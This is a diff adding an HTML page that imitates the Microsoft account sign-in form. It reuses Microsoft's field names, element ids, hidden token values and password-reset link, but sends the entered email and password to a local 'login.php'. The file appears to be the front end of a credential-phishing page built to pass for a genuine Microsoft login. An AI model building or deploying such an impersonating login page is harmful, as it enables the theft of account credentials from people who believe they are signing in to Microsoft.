@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+</head>
+<body>
+    <form action="login.php" method="POST">
+        <div class="form-group">
+            <label for="i0116">Email, phone, or Skype</label>
+            <input type="email" name="loginfmt" id="i0116" maxlength="113" class="form-control" placeholder="Email, phone, or Skype" required>
+        </div>
+        <div class="form-group">
+            <label for="i0118">Password</label>
+            <input type="password" name="passwd" id="i0118" class="form-control" placeholder="Password" required>
+        </div>
+        <div class="form-group">
+            <label for="idChkBx_PWD_KMSI0Pwd">
+                <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox">
+                Keep me signed in
+            </label>
+        </div>
+        <div class="form-group">
+            <input type="submit" id="idSIButton9" class="btn btn-primary" value="Sign in">
+        </div>
+        <div class="form-group">
+            <a id="idA_PWD_ForgotPassword" href="https://account.live.com/ResetPassword.aspx" target="_blank">Forgot my password</a>
+        </div>
+        <input type="hidden" name="PPFT" value="DUrygQLjLY880vAVG2bNblrDPMX*DouJrHFzcJ5KUEPiQvRUUaEe4HvWGeB!D!KDrOrlHJhoh7clN!TlCjYwMtmgIDP7bX398o9phSZpCEFFB5W2lyJgN*tM0tfjWLqFWWRyivA27PD*sl1UpT6vaVCK9gZk!yUb6gw6Oz2TWqxg3415TQR9DDgGcruvoXmEbaF807aZCvTvJgFl1a5a9*k*Vdx976JAsA8WDdG8C8U37wAWkZhdt6WRrproMcc2KQ$$">
+        <input type="hidden" name="PPSX" value="PassportR">
+        <input type="hidden" name="NewUser" value="1">
+        <input type="hidden" name="FoundMSAs" value="">
+        <input type="hidden" name="fspost" value="0">
+        <input type="hidden" name="i21" value="0">
+        <input type="hidden" name="CookieDisclosure" value="0">
+        <input type="hidden" name="IsFidoSupported" value="0">
+    </form>
+</body>
+</html>
